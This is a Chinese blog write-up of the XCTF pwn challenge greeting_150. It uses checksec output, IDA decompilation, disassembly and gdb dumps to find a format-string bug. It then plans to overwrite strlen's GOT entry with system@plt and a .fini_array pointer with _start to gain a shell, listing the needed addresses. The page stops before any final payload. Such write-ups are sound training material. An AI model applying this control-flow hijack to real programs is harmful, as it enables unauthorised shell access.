@@ -1,0 +1,1046 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="XCTF-CHALLENGE-greeting_150, Matrix">
+    <meta name="description" content="昨天好不容易装上pwndbg，总是因为最后./setup时报错，说python3.6找不到命令，在网上找了很多教程都没用，最后把了解到pwndbg相当于一个加强版的gdb，然后我就把gdb删了就顺利装上了😭废话少说，回到题目~~
+chec">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>XCTF-CHALLENGE-greeting_150 | Matrix</title>
+    <link rel="icon" type="image/jpeg" href="/medias/matrix.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/matrix.jpg" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">Matrix</span>
+                    </a>
+                </div>
+                
+
+<a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search" title="搜索"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/matrix.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Matrix</div>
+        <div class="logo-desc">
+            
+            Fight Against Your Fate!
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        
+    </ul>
+
+    <div class="social-link">
+
+
+    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+</div>
+
+            </div>
+        </div>
+
+        
+    </nav>
+</header>
+
+
+
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        XCTF-CHALLENGE-greeting_150
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/xctf-pwn-challenge/" target="_blank">
+                                <span class="chip bg-color">xctf-pwn-challenge</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CFT-PWN/" class="post-category" target="_blank">
+                                CFT-PWN
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-09-03
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        2.1k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        9 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>昨天好不容易装上pwndbg，总是因为最后./setup时报错，说python3.6找不到命令，在网上找了很多教程都没用，最后把了解到pwndbg相当于一个加强版的gdb，然后我就把gdb删了就顺利装上了😭<br>废话少说，回到题目~~</p>
+<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ checksec greeting
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/greeting'</span>
+    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little
+    RELRO<span class="token operator">:</span>    No RELRO
+    Stack<span class="token operator">:</span>    Canary found
+    NX<span class="token operator">:</span>       NX enabled
+    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span></code></pre>
+<p>开启NX和Canary</p>
+<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-84h]</span>
+  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+5Ch] [ebp-44h]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+9Ch] [ebp-4h]</span>
+
+  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please tell me your name... "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">getnline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Don't ignore me ;( "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Nice to meet you, %s :)\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">getline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+size_t __cdecl <span class="token function">getnline</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>
+
+  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v3 <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>
+    <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">nao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+<span class="token keyword">int</span> <span class="token function">nao</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo \"Hello, I'm nao\"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>关键函数：</p>
+<ul>
+<li>getline就是DIY了一个读取函数，一直到换行符结束(0xa==10)读取，并最后将换行符换做截至符\x00</li>
+<li>nao函数，明显是一个hint，调用system函数输出：Hello, I’m nao</li>
+<li>最后printf存在fmt漏洞</li>
+</ul>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看看程序执行情况：</p>
+<pre><code>hunter@hunter:~/PWN/XCTF/xctf_challenge$ ./greeting 
+Hello, I&#39;m nao!
+Please tell me your name... AAAA
+Nice to meet you, AAAA :)</code></pre><p>结合IDA主函数分析，按理不应该出现：Hello, I’m nao! 在main函数中并没有调用nao函数的地方。</p>
+<p>利用IDA查看交叉引用的功能：<br><img src="https://s1.ax1x.com/2020/09/03/wC6zs1.png" alt=""></p>
+<p>继续进入查看：</p>
+<pre class=" language-java"><code class="language-java">text<span class="token operator">:</span><span class="token number">08048708</span> loc_8048708<span class="token operator">:</span>                            <span class="token punctuation">;</span> CODE XREF<span class="token operator">:</span> __libc_csu_init<span class="token operator">+</span><span class="token number">57</span>↓j
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048708</span>                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>arg_8<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span>0804870C                 mov     <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>var_2C<span class="token punctuation">]</span><span class="token punctuation">,</span> ebp
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0804870F</span>                 mov     <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>var_24<span class="token punctuation">]</span><span class="token punctuation">,</span> eax
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048713</span>                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>arg_4<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048717</span>                 mov     <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>var_28<span class="token punctuation">]</span><span class="token punctuation">,</span> eax
+<span class="token punctuation">.</span>text<span class="token operator">:</span>0804871B                 call    ds<span class="token operator">:</span><span class="token punctuation">(</span>__frame_dummy_init_array_entry <span class="token operator">-</span> 8049A28h<span class="token punctuation">)</span><span class="token punctuation">[</span>ebx<span class="token operator">+</span>edi<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">]</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span>此处调用
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048722</span>                 add     edi<span class="token punctuation">,</span> <span class="token number">1</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048725</span>                 cmp     edi<span class="token punctuation">,</span> esi
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048727</span>                 jnz     <span class="token keyword">short</span> loc_8048708
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048729</span>
+
+继续进入：
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C __frame_dummy_init_array_entry dd offset frame_dummy
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> LOAD<span class="token operator">:</span>0804809C↑o
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> __libc_csu_init<span class="token operator">+</span><span class="token number">23</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> Alternative name is <span class="token string">'__init_array_start'</span>
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span>                 dd offset nao
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span> _init_array     ends</code></pre>
+<p>也就是说nao函数先是由<strong>libc_csu_init执行到call    ds:(</strong>frame_dummy_init_array_entry - 8049A28h)[ebx+edi*4]，然后在此地址上存放了nao函数的偏移，由此进行调用。</p>
+<h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><p>我们在用gdb调试的时候，执行完程序不难发现程序会ret到<strong>libc_start_main，所以main函数并不是程序真正开始的地方。程序会先进一些初始化函数如</strong>libc_start_main才会调用main函数。<br>然而在调用初始化函数之前会先调用_start，而_start就是程序真正的入口（Enter Point）</p>
+<p>初始化函数<strong>libc_csu_init是比较常见的，就是在这里上面的程序调用nao函数。<br>那么有初始话函数也就会有对应的末“始”化函数：</strong>libc_csu_fini。他们就像俩兄弟一样，很像</p>
+<p><strong>在程序中存在一种很神秘的段，其名为.init_array，此物存有函数指针，在进行<strong>libc_csu_init函数时，将会调用每一个指针。相似的，在程序中存在.fini_array段，也存放函数指针，在进行</strong>libc_csu_fini函数时便会调用每一个指针。这两处都是可写的 ，那么可以干坏事了（doge）</strong></p>
+<p>这里存放的都是香喷喷的指针</p>
+<pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> ELF Initialization Function Table
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> Segment type<span class="token operator">:</span> Pure data
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> Segment permissions<span class="token operator">:</span> Read<span class="token operator">/</span>Write
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C _init_array     segment dword <span class="token keyword">public</span> <span class="token string">'DATA'</span> use32
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                 assume cs<span class="token operator">:</span>_init_array
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                 <span class="token punctuation">;</span>org 804992Ch
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C __frame_dummy_init_array_entry dd offset frame_dummy
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> LOAD<span class="token operator">:</span>0804809C↑o
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> __libc_csu_init<span class="token operator">+</span><span class="token number">23</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> Alternative name is <span class="token string">'__init_array_start'</span>
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span>                 dd offset nao
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span> _init_array     ends
+<span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span>
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> ELF Termination Function Table
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span>
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> Segment type<span class="token operator">:</span> Pure data
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> Segment permissions<span class="token operator">:</span> Read<span class="token operator">/</span>Write
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> _fini_array     segment dword <span class="token keyword">public</span> <span class="token string">'DATA'</span> use32
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span>                 assume cs<span class="token operator">:</span>_fini_array
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span>                 <span class="token punctuation">;</span>org 8049934h
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span>                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> __libc_csu_init<span class="token operator">+</span><span class="token number">18</span>↑o
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> _fini_array     ends                    <span class="token punctuation">;</span> Alternative name is <span class="token string">'__init_array_end'</span>
+<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span></code></pre>
+<h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><ul>
+<li>存在fmt漏洞并且没有开启RELRO，可以对got表进行覆盖</li>
+<li>有system函数，没有/bin/sh字符串，那么势必要进行两次输入，执行程序两次</li>
+<li>fini_array可以覆盖，控制程序流程</li>
+<li>payload最长46个字节</li>
+</ul>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
+<li>构造payload将strlen的got表覆盖为system_plt</li>
+<li>覆盖.fini_array的一处指针为start地址</li>
+<li>读入/bin/sh直接获取shell</li>
+</ul>
+<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>因为payload长度有限制，所以不太适合用fmtstr_payload模块，必须自己精心构造<br>查看fini_array   0x08049934 处的指针：</p>
+<pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux
+
+__do_global_dtors_aux：
+<span class="token punctuation">.</span>text<span class="token operator">:</span>080485A0 __do_global_dtors_aux proc near         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> <span class="token punctuation">.</span>fini_array<span class="token operator">:</span>__do_global_dtors_aux_fini_array_entry↓o
+<span class="token punctuation">.</span>text<span class="token operator">:</span>080485A0                 cmp     ds<span class="token operator">:</span>completed_6591<span class="token punctuation">,</span> <span class="token number">0</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span>080485A7                 jnz     <span class="token keyword">short</span> locret_80485BC
+<span class="token punctuation">.</span>text<span class="token operator">:</span>080485A9                 push    ebp
+<span class="token punctuation">.</span>text<span class="token operator">:</span>080485AA                 mov     ebp<span class="token punctuation">,</span> esp
+<span class="token punctuation">.</span>text<span class="token operator">:</span>080485AC                 sub     esp<span class="token punctuation">,</span> <span class="token number">8</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span>080485AF                 call    deregister_tm_clones
+<span class="token punctuation">.</span>text<span class="token operator">:</span>080485B4                 mov     ds<span class="token operator">:</span>completed_6591<span class="token punctuation">,</span> <span class="token number">1</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span>080485BB                 leave</code></pre>
+<p>所以指针的值为080485A0 ,用gdb查看更为直观</p>
+<pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10x <span class="token number">0x08049934</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>fini_array
+<span class="token number">0x8049934</span><span class="token operator">:</span>    <span class="token number">0x080485a0</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000001</span>    <span class="token number">0x00000001</span>
+<span class="token number">0x8049944</span><span class="token operator">:</span>    <span class="token number">0x0000000c</span>    <span class="token number">0x08048404</span>    <span class="token number">0x0000000d</span>    <span class="token number">0x08048780</span>
+<span class="token number">0x8049954</span><span class="token operator">:</span>    <span class="token number">0x00000019</span>    <span class="token number">0x0804992c</span>
+pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10x <span class="token number">0x080485a0</span>
+<span class="token number">0x80485a0</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x9aa43d80</span>    <span class="token number">0x75000804</span>    <span class="token number">0xe5895513</span>    <span class="token number">0xe808ec83</span>
+<span class="token number">0x80485b0</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0xffffff7c</span>    <span class="token number">0x9aa405c6</span>    <span class="token number">0xc9010804</span>    <span class="token number">0x9066c3f3</span>
+<span class="token number">0x80485c0</span> <span class="token operator">&lt;</span>frame_dummy<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x049938a1</span>    <span class="token number">0x74c08508</span>
+pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10i <span class="token number">0x080485a0</span>
+   <span class="token number">0x80485a0</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">></span><span class="token operator">:</span>    cmp    BYTE PTR ds<span class="token operator">:</span><span class="token number">0x8049aa4</span><span class="token punctuation">,</span><span class="token number">0x0</span>
+   <span class="token number">0x80485a7</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span><span class="token operator">:</span>    jne    <span class="token number">0x80485bc</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span>
+   <span class="token number">0x80485a9</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span><span class="token operator">:</span>    push   ebp</code></pre>
+<p>所以我们需要的地址如下：</p>
+<pre class=" language-java"><code class="language-java">fini_array <span class="token operator">=</span> <span class="token number">0x08049934</span>  <span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">0x080485A0</span> 
+system_plt <span class="token operator">=</span> <span class="token number">0x08048490</span>
+strlen_got <span class="token operator">=</span> <span class="token number">0x08049A54</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>strlen_addr
+start <span class="token operator">=</span>      <span class="token number">0x080484F0</span> </code></pre>
